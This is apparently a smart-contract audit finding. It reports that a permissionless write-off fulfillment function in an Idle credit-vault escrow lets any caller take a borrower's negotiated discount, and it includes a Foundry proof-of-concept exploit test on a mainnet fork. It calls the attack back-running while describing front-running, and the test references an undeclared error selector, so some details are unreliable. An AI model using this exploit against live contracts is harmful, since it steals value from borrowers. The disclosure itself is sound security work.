### Title
Permissionless `fullfillWriteOffRequest` lets any EOA back-run the borrower and steal the debt write-off discount - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`IdleCreditVaultWriteOffEscrow.fullfillWriteOffRequest` is permissionless (`this function can be called by any wallet`), so the entire write-off discount — the spread between the tranche tokens' redemption value and the `underlyings` the lender asked for — accrues to whichever account submits the fulfillment first. Analogous to the Symmetrical bug where the liquidation fee is paid to whoever appears in `liquidators[partyA][0..1]` regardless of completing the flow, here the economically valuable step (acquiring discounted tranche debt) is captured by the first caller, making the borrower's debt-reduction profit MEVable.

### Finding Description
A lender escrows tranche tokens via `createWriteOffRequest(amount, underlyingsRequested)`, typically pricing `underlyings` below the tranches' claim value (the lender exits early at a discount; the borrower retires debt cheaply). Anyone may then call `fullfillWriteOffRequest(_user, _tranches, _underlyings)`, which pulls `_underlyings` from `msg.sender`, pays the lender `_underlyings - exitFee`, and transfers the escrowed tranche tokens to `msg.sender` (`IdleCreditVaultWriteOffEscrow.sol:123-151`).

Only the borrower can call `IdleCDOEpochVariant.writeOffDeposit` to burn those tranches and reduce `lastNAV`/`expectedEpochInterest` (`IdleCDOEpochVariant.sol:936-963`), but a KYC-passing attacker doesn't need that path: tranche tokens are freely transferable and redeemable at `virtualPrice` via `requestWithdraw`/`claimWithdrawRequest` once the epoch ends. So when `underlyingsRequested < tranche value`, an attacker who sees the borrower's pending `fullfillWriteOffRequest` transaction can copy it with the same `_tranches`/`_underlyings` arguments and land it first, pocketing the discount while paying exactly the lender's ask. The borrower keeps the full debt obligation and loses the discount entirely — a direct, quantifiable transfer of value equal to `trancheValue - underlyingsRequested`.

There is no fulfiller allowlist, no commitment binding the request to the borrower, and `isWalletAllowed`/KYC is not checked on the fulfill path, so none of the existing guards stop it.

### Impact Explanation
Direct theft of the borrower's write-off profit. If a lender requests `9,000e6` USDC for `10,000e18` tranche tokens worth ~`10,000e6`, a back-running attacker captures ~`1,000e6` that was negotiated for the borrower; the borrower's outstanding debt to the vault is unchanged. Repeated across write-off requests this is unbounded MEV extracted from the borrower/LP negotiated settlement.

### Likelihood Explanation
High whenever a discounted request exists: fulfillment calldata is fully determined (`_user`, `_tranches`, `_underlyings` are all public in `userRequests`), so mempool copying is trivial and requires no privileged role — just underlying tokens and, for later redemption, a KYC'd wallet.

### Recommendation
Restrict `fullfillWriteOffRequest` to `msg.sender == borrower` (or a borrower-designated buyer recorded at request creation), or let the lender specify an allowed fulfiller in `WriteOffRequest`, so the negotiated discount cannot be back-run by arbitrary callers.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract WriteOffBackrunPoC is Test {
    // Fork mainnet at the escrow test block (same setup as IdleCreditVaultWriteOffEscrow.t.sol)
    IdleCDOEpochVariant constant cdo = IdleCDOEpochVariant(0xf6223C567F21E33e859ED7A045773526E9E3c2D5);
    address constant LP = 0xA7780086ab732C110E9E71950B9Fb3cb2ea50D89;

    function test_backrunBorrowerFulfill() public {
        vm.createSelectFork("mainnet", 23032567);
        IdleCreditVaultWriteOffEscrow escrow = new IdleCreditVaultWriteOffEscrow();
        vm.store(address(escrow), bytes32(uint256(0)), bytes32(uint256(0)));
        escrow.initialize(address(cdo), address(this), true);

        IERC20Detailed tranche = IERC20Detailed(cdo.AATranche());
        IERC20Detailed usdc = IERC20Detailed(cdo.token());
        IdleCreditVault strategy = IdleCreditVault(cdo.strategy());
        address borrower = strategy.borrower();

        vm.prank(cdo.owner());
        cdo.setKeyringParams(address(0), 1); // open KYC so attacker can later redeem

        // LP escrows 10k tranche tokens asking for 9k USDC (10% discount)
        vm.startPrank(LP);
        tranche.approve(address(escrow), type(uint256).max);
        escrow.createWriteOffRequest(10_000e18, 9_000e6);
        vm.stopPrank();

        address attacker = makeAddr("attacker");
        deal(address(usdc), attacker, 9_000e6);
        deal(address(usdc), borrower, 9_000e6);

        // Attacker copies the borrower's mempool tx and lands it first
        vm.startPrank(attacker);
        usdc.approve(address(escrow), 9_000e6);
        escrow.fullfillWriteOffRequest(LP, 10_000e18, 9_000e6);
        vm.stopPrank();

        // Borrower's identical fulfill now reverts: request is gone
        vm.startPrank(borrower);
        usdc.approve(address(escrow), 9_000e6);
        vm.expectRevert(Is0.selector);
        escrow.fullfillWriteOffRequest(LP, 10_000e18, 9_000e6);
        vm.stopPrank();

        // Attacker holds 10_000 tranche tokens redeemable near par; paid only 9_000 USDC
        assertEq(tranche.balanceOf(attacker), 10_000e18);
        assertEq(tranche.balanceOf(borrower), 0);
        // Profit ~= trancheValue - 9_000e6, stolen from the borrower's write-off discount
    }
}
```
